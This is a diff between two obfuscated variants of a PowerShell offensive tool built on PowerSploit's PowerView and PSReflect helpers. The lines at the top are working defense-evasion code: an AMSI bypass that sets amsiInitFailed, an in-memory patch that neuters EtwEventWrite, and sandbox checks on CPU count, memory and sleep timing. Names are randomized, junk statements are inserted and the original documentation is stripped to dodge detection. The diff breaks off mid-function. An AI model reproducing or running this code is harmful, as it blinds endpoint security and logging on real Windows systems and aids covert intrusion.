@@ -1,104 +1,55 @@
-# ═══ In-Memory Patches (Polymorphic) ═══
-# Runtime memory patch
-$DvNy005a = [int](4835) % 256
-$pauwL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
-$ykPRl = "YEABP"
-$LvhP = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
-$PpyzXjJ = [Ref].Assembly.GetType($pauwL)
-$cY9E = [int](9738) % 256
-$TlXr = $PpyzXjJ.GetField($LvhP, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
-$TlXr.SetValue($null, $true)
-$yJcGFv = "BZPMA"
-
-# ETW blind (P/Invoke)
-$Z5nF = "GUZVJ"
-$JrvGSJ = @"
+Start-Sleep -Milliseconds 3
+$KsYmqqo = @"
 [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
 [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
 "@
-$IGPUz = Add-Type -MemberDefinition $JrvGSJ -Name 'SetObject67' -Namespace 'ProcessResult97' -PassThru
-Start-Sleep -Milliseconds 12
-$rNBU5l7 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
-$uPmIaG0 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
-$rex72 = $IGPUz::LoadLibrary($rNBU5l7)
-$EcEG = $IGPUz::GetProcAddress($rex72, $uPmIaG0)
-Start-Sleep -Milliseconds 20
-$Mt6Tr = 0
-$IGPUz::VirtualProtect($EcEG, [UIntPtr]::new(1), 0x40, [ref]$Mt6Tr) | Out-Null
-$jAtBPQq = [byte[]](0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($jAtBPQq, 0, $EcEG, $jAtBPQq.Length)
-$IGPUz::VirtualProtect($EcEG, [UIntPtr]::new(1), $Mt6Tr, [ref]$Mt6Tr) | Out-Null
-Start-Sleep -Milliseconds 36
+$lWAdX = Add-Type -MemberDefinition $KsYmqqo -Name 'HandleEntry26' -Namespace 'InitItem72' -PassThru
+Start-Sleep -Milliseconds 32
+$PLmv = (-join([byte[]](0x6e,0x74,0x64,0x6c,0x6c,0x2e,0x64,0x6c,0x6c)|%{[char]$_}))
+$tni7vx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
+$HCkRpL = $lWAdX::LoadLibrary($PLmv)
+$oUoBog9 = $lWAdX::GetProcAddress($HCkRpL, $tni7vx)
+[void]([Math]::Abs(91832))
+$AXrT4E = 0
+$lWAdX::VirtualProtect($oUoBog9, [UIntPtr]::new(1), 0x40, [ref]$AXrT4E) | Out-Null
+$oVVxcpOe = [byte[]](0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($oVVxcpOe, 0, $oUoBog9, $oVVxcpOe.Length)
+$lWAdX::VirtualProtect($oUoBog9, [UIntPtr]::new(1), $AXrT4E, [ref]$AXrT4E) | Out-Null
+$mNQc4vxW = [int](5858) % 256
 
-#requires -version 2
 
-<#
+$qGuvu8N = "QEZUB"
+$GO7kG = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
+Start-Sleep -Milliseconds 41
+$fNhS8XN = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
+$dA57gKl = [Ref].Assembly.GetType($GO7kG)
+[void]([Math]::Abs(94982))
+$USrd = $dA57gKl.GetField($fNhS8XN, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
+$USrd.SetValue($null, $true)
+$ue9XP7S = [int](3194) % 256
 
-    PowerSploit File: PowerView.ps1
-    Author: Will Schroeder (@harmj0y)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
 
-#>
-
-########################################################
-#
-# PSReflect code for Windows API access
-# Author: @mattifestation
-#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
-#
-########################################################
-
-# Environment validation
-$UYLzw = [Environment]::ProcessorCount
-if ($UYLzw -lt 2) { exit }
-$MuEw = [long]0
+$J37oXy = [Environment]::ProcessorCount
+if ($J37oXy -lt 2) { exit }
+$U98QSN7h = [long]0
 try {
-    $tfHcpEfb = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
-    if ($null -ne $tfHcpEfb) {
-        $MuEw = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+    $tKTJqSW = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
+    if ($null -ne $tKTJqSW) {
+        $U98QSN7h = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
-        $MuEw = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+        $U98QSN7h = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     }
 } catch {
-    $MuEw = 0
+    $U98QSN7h = 0
 }
-if ($MuEw -gt 0 -and $MuEw -lt 2GB) { exit }
-$BAms = [System.DateTime]::Now
-Start-Sleep -Milliseconds 1803
-if (([System.DateTime]::Now - $BAms).TotalMilliseconds -lt 1442) { exit }
-function HandleResult95($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
+if ($U98QSN7h -gt 0 -and $U98QSN7h -lt 2GB) { exit }
+$HpZUz1 = [System.DateTime]::Now
+Start-Sleep -Milliseconds 1756
+if (([System.DateTime]::Now - $HpZUz1).TotalMilliseconds -lt 1404) { exit }
+function ParseEntry20($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
 function New-InMemoryModule
 {
-<#
-    .SYNOPSIS
-
-        Creates an in-memory assembly and module
-
-        Author: Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-
-    .DESCRIPTION
-
-        When defining custom enums, structs, and unmanaged functions, it is
-        necessary to associate to an assembly module. This helper function
-        creates an in-memory module that can be passed to the 'enum',
-        'struct', and Add-Win32Type functions.
-
-    .PARAMETER ModuleName
-
-        Specifies the desired name for the in-memory assembly and module. If
-        ModuleName is not provided, it will default to a GUID.
-
-    .EXAMPLE
-
-        $Module = New-InMemoryModule -ModuleName Win32
-#>
-
     Param
     (
         [Parameter(Position = 0)]
@@ -106,26 +57,18 @@ function New-InMemoryModule
         [String]
         $ModuleName = [Guid]::NewGuid().ToString()
     )
-
-    $tJvh7Ov = [AppDomain]::CurrentDomain.GetAssemblies()
-
-    ForEach ($Assembly in $tJvh7Ov) {
+    $F8Wg6n = [AppDomain]::CurrentDomain.GetAssemblies()
+    ForEach ($Assembly in $F8Wg6n) {
         if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
             return $Assembly
         }
     }
-
-    $cEoB = New-Object Reflection.AssemblyName($ModuleName)
+    $Bxiv = New-Object Reflection.AssemblyName($ModuleName)
     $Domain = [AppDomain]::CurrentDomain
-    $nhYQlhYq = $Domain.DefineDynamicAssembly($cEoB, 'Run')
-    $J7gKF = $nhYQlhYq.DefineDynamicModule($ModuleName, $False)
-
-    return $J7gKF
+    $sqAJBZ = $Domain.DefineDynamicAssembly($Bxiv, 'Run')
+    $dTzALG = $sqAJBZ.DefineDynamicModule($ModuleName, $False)
+    return $dTzALG
 }
-
-
-# A helper function used to reduce typing while defining function
-# prototypes for Add-Win32Type.
 function func
 {
     Param
@@ -133,383 +76,179 @@ function func
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
         $DllName,
-
         [Parameter(Position = 1, Mandatory = $True)]
         [String]
         $FunctionName,
-
         [Parameter(Position = 2, Mandatory = $True)]
         [Type]
         $ReturnType,
-
         [Parameter(Position = 3)]
         [Type[]]
         $ParameterTypes,
-
         [Parameter(Position = 4)]
         [Runtime.InteropServices.CallingConvention]
         $NativeCallingConvention,
-
         [Parameter(Position = 5)]
         [Runtime.InteropServices.CharSet]
         $Charset,
-
         [Switch]
         $SetLastError
     )
-
     $Properties = @{
         DllName = $DllName
         FunctionName = $FunctionName
         ReturnType = $ReturnType
     }
-
     if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
     if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
     if ($Charset) { $Properties['Charset'] = $Charset }
     if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
-
     New-Object PSObject -Property $Properties
 }
-
-
 function Add-Win32Type
 {
-<#
-    .SYNOPSIS
-
-        Creates a .NET type for an unmanaged Win32 function.
-
-        Author: Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: func
-
-    .DESCRIPTION
-
-        Add-Win32Type enables you to easily interact with unmanaged (i.e.
-        Win32 unmanaged) functions in PowerShell. After providing
-        Add-Win32Type with a function signature, a .NET type is created
-        using reflection (i.e. csc.exe is never called like with Add-Type).
-
-        The 'func' helper function can be used to reduce typing when defining
-        multiple function definitions.
-
-    .PARAMETER DllName
-
-        The name of the DLL.
-
-    .PARAMETER FunctionName
-
-        The name of the target function.
-
-    .PARAMETER ReturnType
-
-        The return type of the function.
-
-    .PARAMETER ParameterTypes
-
-        The function parameters.
-
-    .PARAMETER NativeCallingConvention
-
-        Specifies the native calling convention of the function. Defaults to
-        stdcall.
-
-    .PARAMETER Charset
-
-        If you need to explicitly call an 'A' or 'W' Win32 function, you can
-        specify the character set.
-
-    .PARAMETER SetLastError
-
-        Indicates whether the callee calls the SetLastError Win32 API
-        function before returning from the attributed method.
-
-    .PARAMETER Module
-
-        The in-memory module that will host the functions. Use
-        New-InMemoryModule to define an in-memory module.
-
-    .PARAMETER Namespace
-
-        An optional namespace to prepend to the type. Add-Win32Type defaults
-        to a namespace consisting only of the name of the DLL.
-
-    .EXAMPLE
-
-        $Mod = New-InMemoryModule -ModuleName Win32
-
-        $FunctionDefinitions = @(
-          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
-          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
-          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
-        )
-
-        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
-        $Kernel32 = $Types['kernel32']
-        $Ntdll = $Types['ntdll']
-        $Ntdll::RtlGetCurrentPeb()
-        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
-        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
-
-    .NOTES
-
-        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
-
-        When defining multiple function prototypes, it is ideal to provide
-        Add-Win32Type with an array of function signatures. That way, they
-        are all incorporated into the same in-memory module.
-#>
-
     [OutputType([Hashtable])]
     Param(
         [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
         [String]
         $DllName,
-
         [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
         [String]
         $FunctionName,
-
         [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
         [Type]
         $ReturnType,
-
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [Type[]]
         $ParameterTypes,
-
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [Runtime.InteropServices.CallingConvention]
         $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
-
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [Runtime.InteropServices.CharSet]
         $Charset = [Runtime.InteropServices.CharSet]::Auto,
-
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [Switch]
         $SetLastError,
-
         [Parameter(Mandatory = $True)]
         [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
         $Module,
-
         [ValidateNotNull()]
         [String]
         $Namespace = ''
     )
-
     BEGIN
     {
-        $sYIrC3 = @{}
+        $LODeO = @{}
     }
-
     PROCESS
     {
         if ($Module -is [Reflection.Assembly])
         {
             if ($Namespace)
             {
-                $sYIrC3[$DllName] = $Module.GetType(($Namespace + "." + $DllName))
+                $LODeO[$DllName] = $Module.GetType(($Namespace + "." + $DllName))
             }
             else
             {
-                $sYIrC3[$DllName] = $Module.GetType($DllName)
+                $LODeO[$DllName] = $Module.GetType($DllName)
             }
         }
         else
         {
-            # Define one type for each DLL
-            if (!$sYIrC3.ContainsKey($DllName))
+            if (!$LODeO.ContainsKey($DllName))
             {
                 if ($Namespace)
                 {
-                    $sYIrC3[$DllName] = $Module.DefineType(($Namespace + "." + $DllName), 'Public,BeforeFieldInit')
+                    $LODeO[$DllName] = $Module.DefineType(($Namespace + "." + $DllName), 'Public,BeforeFieldInit')
                 }
                 else
                 {
-                    $sYIrC3[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
+                    $LODeO[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                 }
             }
-
-            $CByfstuP = $sYIrC3[$DllName].DefineMethod(
+            $dBTTFvP = $LODeO[$DllName].DefineMethod(
                 $FunctionName,
                 'Public,Static,PinvokeImpl',
                 $ReturnType,
                 $ParameterTypes)
-
-            # Make each ByRef parameter an Out parameter
-            $kUfFVle = 1
-            ForEach($bWziVtk4 in $ParameterTypes)
+            $h4S0 = 1
+            ForEach($ThQb in $ParameterTypes)
             {
-                if ($bWziVtk4.IsByRef)
+                if ($ThQb.IsByRef)
                 {
-                    [void] $CByfstuP.DefineParameter($kUfFVle, 'Out', $Null)
+                    [void] $dBTTFvP.DefineParameter($h4S0, 'Out', $Null)
                 }
-
-                $kUfFVle++
+                $h4S0++
             }
-
-            $F464KR = [Runtime.InteropServices.DllImportAttribute]
-            $arXU = $F464KR.GetField('SetLastError')
-            $zAeAP = $F464KR.GetField('CallingConvention')
-            $v0k9f9n8 = $F464KR.GetField('CharSet')
-            if ($SetLastError) { $VxmDtzp = $True } else { $VxmDtzp = $False }
-
-            # Equivalent to C# version of [DllImport(DllName)]
+            $DXre4NM = [Runtime.InteropServices.DllImportAttribute]
+            $SIxSMqR = $DXre4NM.GetField('SetLastError')
+            $p7OfHD4 = $DXre4NM.GetField('CallingConvention')
+            $Eaj7pge = $DXre4NM.GetField('CharSet')
+            if ($SetLastError) { $Tam1 = $True } else { $Tam1 = $False }
             $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
-            $ssZr95A0 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
+            $xctSPC = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                 $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
-                [Reflection.FieldInfo[]] @($arXU, $zAeAP, $v0k9f9n8),
-                [Object[]] @($VxmDtzp, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
-
-            $CByfstuP.SetCustomAttribute($ssZr95A0)
+                [Reflection.FieldInfo[]] @($SIxSMqR, $p7OfHD4, $Eaj7pge),
+                [Object[]] @($Tam1, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
+            $dBTTFvP.SetCustomAttribute($xctSPC)
         }
     }
-
     END
     {
         if ($Module -is [Reflection.Assembly])
         {
-            return $sYIrC3
+            return $LODeO
         }
-
-        $BBQ0 = @{}
-
-        ForEach ($RXgmW2 in $sYIrC3.Keys)
+        $lzH7Y7k = @{}
+        ForEach ($rRcQU in $LODeO.Keys)
         {
-            $Type = $sYIrC3[$RXgmW2].CreateType()
-
-            $BBQ0[$RXgmW2] = $Type
+            $Type = $LODeO[$rRcQU].CreateType()
+            $lzH7Y7k[$rRcQU] = $Type
         }
-
-        return $BBQ0
+        return $lzH7Y7k
     }
 }
-
-
 function psenum
 {
-<#
-    .SYNOPSIS
-
-        Creates an in-memory enumeration for use in your PowerShell session.
-
-        Author: Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-     
-    .DESCRIPTION
-
-        The 'psenum' function facilitates the creation of enums entirely in
-        memory using as close to a "C style" as PowerShell will allow.
-
-    .PARAMETER Module
-
-        The in-memory module that will host the enum. Use
-        New-InMemoryModule to define an in-memory module.
-
-    .PARAMETER FullName
-
-        The fully-qualified name of the enum.
-
-    .PARAMETER Type
-
-        The type of each enum element.
-
-    .PARAMETER EnumElements
-
-        A hashtable of enum elements.
-
-    .PARAMETER Bitfield
-
-        Specifies that the enum should be treated as a bitfield.
-
-    .EXAMPLE
-
-        $Mod = New-InMemoryModule -ModuleName Win32
-
-        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
-            UNKNOWN =                  0
-            NATIVE =                   1 # Image doesn't require a subsystem.
-            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
-            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
-            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
-            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
-            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
-            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
-            EFI_APPLICATION =          10
-            EFI_BOOT_SERVICE_DRIVER =  11
-            EFI_RUNTIME_DRIVER =       12
-            EFI_ROM =                  13
-            XBOX =                     14
-            WINDOWS_BOOT_APPLICATION = 16
-        }
-
-    .NOTES
-
-        PowerShell purists may disagree with the naming of this function but
-        again, this was developed in such a way so as to emulate a "C style"
-        definition as closely as possible. Sorry, I'm not going to name it
-        New-Enum. :P
-#>
-
     [OutputType([Type])]
     Param
     (
         [Parameter(Position = 0, Mandatory = $True)]
         [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
         $Module,
-
         [Parameter(Position = 1, Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
         $FullName,
-
         [Parameter(Position = 2, Mandatory = $True)]
         [Type]
         $Type,
-
         [Parameter(Position = 3, Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [Hashtable]
         $EnumElements,
-
         [Switch]
         $Bitfield
     )
-
     if ($Module -is [Reflection.Assembly])
     {
         return ($Module.GetType($FullName))
     }
-
-    $BlP6yiV = $Type -as [Type]
-
-    $eMMjK = $Module.DefineEnum($FullName, 'Public', $BlP6yiV)
-
+    $rRqZISTA = $Type -as [Type]
+    $fUYd = $Module.DefineEnum($FullName, 'Public', $rRqZISTA)
     if ($Bitfield)
     {
-        $iHHOfZ = [FlagsAttribute].GetConstructor(@())
-        $FfnOwN = New-Object Reflection.Emit.CustomAttributeBuilder($iHHOfZ, @())
-        $eMMjK.SetCustomAttribute($FfnOwN)
+        $gyUsxq = [FlagsAttribute].GetConstructor(@())
+        $BvhqY = New-Object Reflection.Emit.CustomAttributeBuilder($gyUsxq, @())
+        $fUYd.SetCustomAttribute($BvhqY)
     }
-
-    ForEach ($RXgmW2 in $EnumElements.Keys)
+    ForEach ($rRcQU in $EnumElements.Keys)
     {
-        # Apply the specified enum type to each element
-        $Null = $eMMjK.DefineLiteral($RXgmW2, $EnumElements[$RXgmW2] -as $BlP6yiV)
+        $Null = $fUYd.DefineLiteral($rRcQU, $EnumElements[$rRcQU] -as $rRqZISTA)
     }
-
-    $eMMjK.CreateType()
+    $fUYd.CreateType()
 }
-
-
-# A helper function used to reduce typing while defining struct
-# fields.
 function field
 {
     Param
@@ -517,19 +256,15 @@ function field
         [Parameter(Position = 0, Mandatory = $True)]
         [UInt16]
         $Position,
-
         [Parameter(Position = 1, Mandatory = $True)]
         [Type]
         $Type,
-
         [Parameter(Position = 2)]
         [UInt16]
         $Offset,
-
         [Object[]]
         $MarshalAs
     )
-
     @{
         Position = $Position
         Type = $Type -as [Type]
@@ -537,445 +272,195 @@ function field
         MarshalAs = $MarshalAs
     }
 }
-
-
 function struct
 {
-<#
-    .SYNOPSIS
-
-        Creates an in-memory struct for use in your PowerShell session.
-
-        Author: Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: field
-
-    .DESCRIPTION
-
-        The 'struct' function facilitates the creation of structs entirely in
-        memory using as close to a "C style" as PowerShell will allow. Struct
-        fields are specified using a hashtable where each field of the struct
-        is comprosed of the order in which it should be defined, its .NET
-        type, and optionally, its offset and special marshaling attributes.
-
-        One of the features of 'struct' is that after your struct is defined,
-        it will come with a built-in GetSize method as well as an explicit
-        converter so that you can easily cast an IntPtr to the struct without
-        relying upon calling SizeOf and/or PtrToStructure in the Marshal
-        class.
-
-    .PARAMETER Module
-
-        The in-memory module that will host the struct. Use
-        New-InMemoryModule to define an in-memory module.
-
-    .PARAMETER FullName
-
-        The fully-qualified name of the struct.
-
-    .PARAMETER StructFields
-
-        A hashtable of fields. Use the 'field' helper function to ease
-        defining each field.
-
-    .PARAMETER PackingSize
-
-        Specifies the memory alignment of fields.
-
-    .PARAMETER ExplicitLayout
-
-        Indicates that an explicit offset for each field will be specified.
-
-    .EXAMPLE
-
-        $Mod = New-InMemoryModule -ModuleName Win32
-
-        $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
-            DOS_SIGNATURE =    0x5A4D
-            OS2_SIGNATURE =    0x454E
-            OS2_SIGNATURE_LE = 0x454C
-            VXD_SIGNATURE =    0x454C
-        }
-
-        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
-            e_magic =    field 0 $ImageDosSignature
-            e_cblp =     field 1 UInt16
-            e_cp =       field 2 UInt16
-            e_crlc =     field 3 UInt16
-            e_cparhdr =  field 4 UInt16
-            e_minalloc = field 5 UInt16
-            e_maxalloc = field 6 UInt16
-            e_ss =       field 7 UInt16
-            e_sp =       field 8 UInt16
-            e_csum =     field 9 UInt16
-            e_ip =       field 10 UInt16
-            e_cs =       field 11 UInt16
-            e_lfarlc =   field 12 UInt16
-            e_ovno =     field 13 UInt16
-            e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
-            e_oemid =    field 15 UInt16
-            e_oeminfo =  field 16 UInt16
-            e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
-            e_lfanew =   field 18 Int32
-        }
-
-        # Example of using an explicit layout in order to create a union.
-        $TestUnion = struct $Mod TestUnion @{
-            field1 = field 0 UInt32 0
-            field2 = field 1 IntPtr 0
-        } -ExplicitLayout
-
-    .NOTES
-
-        PowerShell purists may disagree with the naming of this function but
-        again, this was developed in such a way so as to emulate a "C style"
-        definition as closely as possible. Sorry, I'm not going to name it
-        New-Struct. :P
-#>
-
     [OutputType([Type])]
     Param
     (
         [Parameter(Position = 1, Mandatory = $True)]
         [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
         $Module,
-
         [Parameter(Position = 2, Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
         $FullName,
-
         [Parameter(Position = 3, Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [Hashtable]
         $StructFields,
-
         [Reflection.Emit.PackingSize]
         $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
-
         [Switch]
         $ExplicitLayout
     )
-
     if ($Module -is [Reflection.Assembly])
     {
         return ($Module.GetType($FullName))
     }
-
-    [Reflection.TypeAttributes] $N9uUwR8 = 'AnsiClass,
+    [Reflection.TypeAttributes] $cv9Dqi = 'AnsiClass,
         Class,
         Public,
         Sealed,
         BeforeFieldInit'
-
     if ($ExplicitLayout)
     {
-        $N9uUwR8 = $N9uUwR8 -bor [Reflection.TypeAttributes]::ExplicitLayout
+        $cv9Dqi = $cv9Dqi -bor [Reflection.TypeAttributes]::ExplicitLayout
     }
     else
     {
-        $N9uUwR8 = $N9uUwR8 -bor [Reflection.TypeAttributes]::SequentialLayout
+        $cv9Dqi = $cv9Dqi -bor [Reflection.TypeAttributes]::SequentialLayout
     }
-
-    $Yutpe = $Module.DefineType($FullName, $N9uUwR8, [ValueType], $PackingSize)
-    $gEJc21n = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
-    $vZ97 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
-
-    $w9G8LXKJ = New-Object Hashtable[]($StructFields.Count)
-
-    # Sort each field according to the orders specified
-    # Unfortunately, PSv2 doesn't have the luxury of the
-    # hashtable [Ordered] accelerator.
-    ForEach ($zPk8I in $StructFields.Keys)
+    $rbgzr = $Module.DefineType($FullName, $cv9Dqi, [ValueType], $PackingSize)
+    $D0IQE = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+    $reSGb2b = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+    $iz33K = New-Object Hashtable[]($StructFields.Count)
+    ForEach ($gS1AwJf in $StructFields.Keys)
     {
-        $sfOxA8mE = $StructFields[$zPk8I]['Position']
-        $w9G8LXKJ[$sfOxA8mE] = @{FieldName = $zPk8I; Properties = $StructFields[$zPk8I]}
+        $lCc7KfW = $StructFields[$gS1AwJf]['Position']
+        $iz33K[$lCc7KfW] = @{FieldName = $gS1AwJf; Properties = $StructFields[$gS1AwJf]}
     }
-
-    ForEach ($zPk8I in $w9G8LXKJ)
+    ForEach ($gS1AwJf in $iz33K)
     {
-        $i2nv5ZF = $zPk8I['FieldName']
-        $F9TZ7Zhz = $zPk8I['Properties']
-
-        $Offset = $F9TZ7Zhz['Offset']
-        $Type = $F9TZ7Zhz['Type']
-        $MarshalAs = $F9TZ7Zhz['MarshalAs']
-
-        $nLvETK = $Yutpe.DefineField($i2nv5ZF, $Type, 'Public')
-
+        $i79X8PYR = $gS1AwJf['FieldName']
+        $lrmkU9 = $gS1AwJf['Properties']
+        $Offset = $lrmkU9['Offset']
+        $Type = $lrmkU9['Type']
+        $MarshalAs = $lrmkU9['MarshalAs']
+        $MNpB = $rbgzr.DefineField($i79X8PYR, $Type, 'Public')
         if ($MarshalAs)
         {
-            $BAF91v = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
+            $AlnX = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
             if ($MarshalAs[1])
             {
-                $Cb0EGR = $MarshalAs[1]
-                $nVnN = New-Object Reflection.Emit.CustomAttributeBuilder($gEJc21n,
-                    $BAF91v, $vZ97, @($Cb0EGR))
+                $Ynl1hE = $MarshalAs[1]
+                $SEdLfIQ = New-Object Reflection.Emit.CustomAttributeBuilder($D0IQE,
+                    $AlnX, $reSGb2b, @($Ynl1hE))
             }
             else
             {
-                $nVnN = New-Object Reflection.Emit.CustomAttributeBuilder($gEJc21n, [Object[]] @($BAF91v))
+                $SEdLfIQ = New-Object Reflection.Emit.CustomAttributeBuilder($D0IQE, [Object[]] @($AlnX))
             }
-
-            $nLvETK.SetCustomAttribute($nVnN)
+            $MNpB.SetCustomAttribute($SEdLfIQ)
         }
-
-        if ($ExplicitLayout) { $nLvETK.SetOffset($Offset) }
+        if ($ExplicitLayout) { $MNpB.SetOffset($Offset) }
     }
-
-    # Make the struct aware of its own size.
-    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
-    $G9Fw = $Yutpe.DefineMethod('GetSize',
+    $pVoBKd = $rbgzr.DefineMethod('GetSize',
         'Public, Static',
         [Int],
         [Type[]] @())
-    $n3ZKX = $G9Fw.GetILGenerator()
-    # Thanks for the help, Jason Shirk!
-    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Yutpe)
-    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Call,
+    $oU4m = $pVoBKd.GetILGenerator()
+    $oU4m.Emit([Reflection.Emit.OpCodes]::Ldtoken, $rbgzr)
+    $oU4m.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
-    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Call,
+    $oU4m.Emit([Reflection.Emit.OpCodes]::Call,
         [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
-    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Ret)
-
-    # Allow for explicit casting from an IntPtr
-    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
-    $HsD5cg = $Yutpe.DefineMethod('op_Implicit',
+    $oU4m.Emit([Reflection.Emit.OpCodes]::Ret)
+    $bpu6pH = $rbgzr.DefineMethod('op_Implicit',
         'PrivateScope, Public, Static, HideBySig, SpecialName',
-        $Yutpe,
+        $rbgzr,
         [Type[]] @([IntPtr]))
-    $MzxH = $HsD5cg.GetILGenerator()
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Nop)
-    $MzxH.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
